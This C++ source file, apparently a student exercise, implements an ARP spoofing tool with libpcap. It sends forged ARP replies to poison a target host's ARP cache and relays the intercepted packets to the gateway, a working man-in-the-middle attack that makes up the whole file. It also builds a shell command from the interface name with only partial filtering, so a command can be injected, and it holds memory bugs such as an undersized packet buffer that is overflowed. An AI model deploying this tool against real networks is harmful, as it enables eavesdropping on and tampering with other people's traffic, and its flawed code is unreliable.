#include <iostream>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <thread>
#include <vector>
#include <atomic>
#include <pcap.h>

#define REQUEST 0x0001
#define REPLY 0x0002

using namespace std;

char* dev = NULL;
uint8_t gateway[6];
uint8_t my_mac[6];

#pragma pack(push,1)
struct eth_header {
	uint8_t dest_mac[6];
	uint8_t src_mac[6];
	uint16_t type;
};

struct arp_header {
	uint16_t hw_type;
	uint16_t protocol;
	uint8_t hw_addr_len;
	uint8_t protocol_addr_len;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint32_t sender_ip;
	uint8_t target_mac[6];
	uint32_t target_ip;
};
#pragma pack(pop)

void init(struct eth_header* eth_hdr, struct arp_header* arp_hdr) {
	eth_hdr->type = htons(0x0806);
	arp_hdr->hw_type = htons(0x0001);
	arp_hdr->protocol = htons(0x0800);
	arp_hdr->hw_addr_len = 0x06;
	arp_hdr->protocol_addr_len = 0x04;
	for (int i=0; i<6; i++) {
		eth_hdr->dest_mac[i] = 0xff;
		arp_hdr->target_mac[i] = 0x00;
	}
	arp_hdr->opcode = htons(REQUEST);
}

void print_packet(struct eth_header* eth_hdr, struct arp_header* arp_hdr) {
	printf("PACKET SIZE: %d\n", sizeof(*arp_hdr));
	printf("---------------------------------------------------\n");
	printf("ether_src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
 eth_hdr->src_mac[0], eth_hdr->src_mac[1], eth_hdr->src_mac[2],
 eth_hdr->src_mac[3], eth_hdr->src_mac[4], eth_hdr->src_mac[5]);
	printf("ether_dest_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
 eth_hdr->dest_mac[0], eth_hdr->dest_mac[1], eth_hdr->dest_mac[2],
 eth_hdr->dest_mac[3], eth_hdr->dest_mac[4], eth_hdr->dest_mac[5]);
	printf("ethernet type: %04x\n", ntohs(eth_hdr->type));
	printf("---------------------------------------------------\n");
	printf("hw_type: %04x\n", ntohs(arp_hdr->hw_type));
	printf("protocol: %04x\n", ntohs(arp_hdr->protocol));
	printf("hw_addr_len: %02x\n", arp_hdr->hw_addr_len);
	printf("protocol_addr_len: %02x\n", arp_hdr->protocol_addr_len);
	printf("sender_ip: %08x\n", arp_hdr->sender_ip);
	printf("target_ip: %08x\n", arp_hdr->target_ip);
	printf("sender_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
 arp_hdr->sender_mac[0], arp_hdr->sender_mac[1], arp_hdr->sender_mac[2],
 arp_hdr->sender_mac[3], arp_hdr->sender_mac[4], arp_hdr->sender_mac[5]);
	printf("target_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
 arp_hdr->target_mac[0], arp_hdr->target_mac[1], arp_hdr->target_mac[2],
 arp_hdr->target_mac[3], arp_hdr->target_mac[4], arp_hdr->target_mac[5]);
}

void my_inet_aton(char* strIP, uint32_t* hexIP) {
	uint32_t tmp[4] = { 0, 0, 0, 0 };
	for (int i=strlen(strIP)-1, cipher=1, j=0; i >= 0; i--) {
		if (strIP[i] == '.') {
			cipher = 1;
			j++;
			continue;
		}
		tmp[j] += (strIP[i]-'0')*cipher;
		cipher *= 10;
	}
	tmp[0] <<= 24;
	tmp[1] <<= 16;
	tmp[2] <<= 8;
	uint32_t res = (tmp[0] | tmp[1] | tmp[2] | tmp[3]);
	(*hexIP) = res;
}

void strToHexMac(char* buf, uint8_t* mac) {
	for (int i=0, j=0; i < 18 && j < 6; i++,j++) {
		uint8_t tmp1, tmp2;
		if (buf[i] >= 'a' && buf[i] <= 'f') 
			tmp1 = buf[i]-'a'+10;
		else if (buf[i] >= '0' && buf[i] <= '9')
			tmp1 = buf[i]-'0';
		else tmp1 = 0;
		i++;
		if (buf[i] >= 'a' && buf[i] <= 'f')
			tmp2 = buf[i]-'a'+10;
		else if (buf[i] >= '0' && buf[i] <= '9')
			tmp2 = buf[i]-'0'+0;
		else tmp2 = 0;
		i++;
		mac[j] = (tmp1 << 4) | tmp2;
	}
}

int getMyNetworkInfo(uint8_t* res, uint32_t* ip) {
	if (strchr(dev, ';') != NULL || strchr(dev, '|') != NULL) return -1;
	FILE *fp;
	char buf[20];
	char cmd[128] = "arp -n | grep ether | awk '{print $3}' && ifconfig ";
	char *cmd1 = " | grep ether | awk '{print $2}'";
	char *cmd2 = " && ifconfig ";
	char *cmd3 = " | grep netmask | awk '{print $2}';";

	strcat(cmd, dev);
	strcat(cmd, cmd1);
	strcat(cmd, cmd2);
	strcat(cmd, dev);
	strcat(cmd, cmd3);
	fp = popen(cmd, "r");
	if (NULL == fgets(buf, sizeof(buf), fp)) return -1;
	strToHexMac(buf, gateway);
	if (NULL == fgets(buf, sizeof(buf), fp)) return -1;
	strToHexMac(buf, res);
	if (NULL == fgets(buf, sizeof(buf), fp)) return -1;
	int len = strlen(buf);
	buf[len-1] = 0; // remove '\n'
	my_inet_aton(buf, ip);
	pclose(fp);
	return 0;
}


void* _func(u_char* packet, int packet_size) {
	u_char* copied = packet;
	packet = NULL;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return NULL;
	} 

	while (1) {
		if (pcap_sendpacket(handle, copied, packet_size) == -1) {
			printf("ARP Spoofing Failed..\n");
			break;
		}
		printf("ARP Spoofing Success!!!\n");
		struct eth_header *recv_eth_hdr;
		struct pcap_pkthdr* header;
		const u_char* spoofed_packet;
		while (1) {
			int res = pcap_next_ex(handle, &header, &spoofed_packet);
			if (res < 0) break;
			if (res == 0) continue;
			recv_eth_hdr = (struct eth_header*) spoofed_packet;
			if (ntohs(recv_eth_hdr->type) != ETHERTYPE_ARP) {
				if (!memcmp(recv_eth_hdr->dest_mac, my_mac, 6)) {
					printf("Spoofed Packet=======================================\n");
					printf("Src MAC: ");
					for (int i=0; i<6; i++) printf("%02x ", recv_eth_hdr->src_mac[i]);
					printf("\nDest MAC: ");
					for (int i=0; i<6; i++) printf("%02x ", recv_eth_hdr->dest_mac[i]);
					printf("\n=====================================================\n");

					memcpy(recv_eth_hdr->dest_mac, gateway, 6);
					memcpy(recv_eth_hdr->src_mac, my_mac, 6);
					printf("Relay Packet=======================================\n");
					printf("Src MAC: ");
					for (int i=0; i<6; i++) printf("%02x ", recv_eth_hdr->src_mac[i]);
					printf("\nDest MAC: ");
					for (int i=0; i<6; i++) printf("%02x ", recv_eth_hdr->dest_mac[i]);
					printf("\n=====================================================\n");
					
					if (pcap_sendpacket(handle, spoofed_packet, packet_size) == -1) {
						printf("Relay Failed..\n");
					} else {
						printf("Relay Success!!!!\n");
						break;
					}
				}
			}
		}
		sleep(1);
	}
	free(copied);
	pcap_close(handle);
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		printf("Usage: ./arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
		return -1;
	}
	
	struct eth_header *eth_hdr = (struct eth_header*) malloc(sizeof(struct eth_header));
	struct arp_header *arp_hdr = (struct arp_header*) malloc(sizeof(struct arp_header));
	if (eth_hdr == NULL || arp_hdr == NULL) return -3;
	vector<thread> threads;

	uint32_t my_ip;
	uint32_t sender_ip;
	dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	if (getMyNetworkInfo(my_mac, &my_ip) == -1) return -1;
	for (int i=0; i<6; i++) 
		eth_hdr->src_mac[i] = arp_hdr->sender_mac[i] = my_mac[i];
	printf("MY IP: %x\n", my_ip);
	
	int eth_sz = sizeof(*eth_hdr);
	int arp_sz = sizeof(*arp_hdr);
	u_char* packet = (u_char*) malloc(sizeof(eth_sz+arp_sz));
	if (packet == NULL) return -3;
	
	for (int i=2, j=2, _sz=eth_sz+arp_sz; j <= argc/2; i+=2, j++) {
		my_inet_aton(argv[i], &sender_ip);
		arp_hdr->sender_ip = my_ip; // 실제 내 ip
		my_inet_aton(argv[i+1], &arp_hdr->target_ip);
		init(eth_hdr, arp_hdr);
		memset(packet, 0, sizeof(_sz));
		memcpy(packet, eth_hdr, eth_sz);
		memcpy(packet+14, arp_hdr, arp_sz);
		
		if (pcap_sendpacket(handle, packet, _sz) == -1) {
			printf("Send failure\n");
			return -1;
		}

		printf("ARP Request========================================%d\n", (j-1));
		print_packet(eth_hdr, arp_hdr);
		printf("=====================================================\n");

		struct pcap_pkthdr *header = NULL;
		memset(packet, 0, sizeof(_sz));
		while (1) {
			int res = pcap_next_ex(handle, &header, ((const u_char**)&packet));
			if (res < 0) break;
			if (res == 0) continue;
			eth_hdr = (struct eth_header*) packet;
			arp_hdr = (struct arp_header*) (packet + 14);
			if (ntohs(eth_hdr->type) == ETHERTYPE_ARP) {
				if (arp_hdr->target_ip == my_ip) {
					printf("ARP Reply============================================\n");
					print_packet(eth_hdr, arp_hdr);
					printf("=====================================================\n");
					
					printf("TARGET MAC: ");
					for(int i=0; i<6; i++) {
						printf("%02x ", eth_hdr->src_mac[i]);
					}
					printf("TARGET IP: %04x\n", arp_hdr->sender_ip);
					printf("=====================================================\n");
					
					printf("ARP Spoofing=========================================\n");
					memcpy(eth_hdr->dest_mac, eth_hdr->src_mac, 6);
					memcpy(eth_hdr->src_mac, my_mac, 6);
					memcpy(arp_hdr->target_mac, eth_hdr->dest_mac, 6);
					memcpy(arp_hdr->sender_mac, my_mac, 6);

					arp_hdr->target_ip = arp_hdr->sender_ip;
					arp_hdr->sender_ip = sender_ip;
					print_packet(eth_hdr, arp_hdr);
					memcpy(packet, eth_hdr, eth_sz);
					memcpy(packet+14, arp_hdr, arp_sz);
					printf("=====================================================\n");

					threads.push_back(thread(_func, packet, _sz));
					break;
				}
			}
		}
	}

	for (auto& th : threads) th.join();

	free(packet);
	free(arp_hdr);
	free(eth_hdr);
	pcap_close(handle);
	return 0; 
}
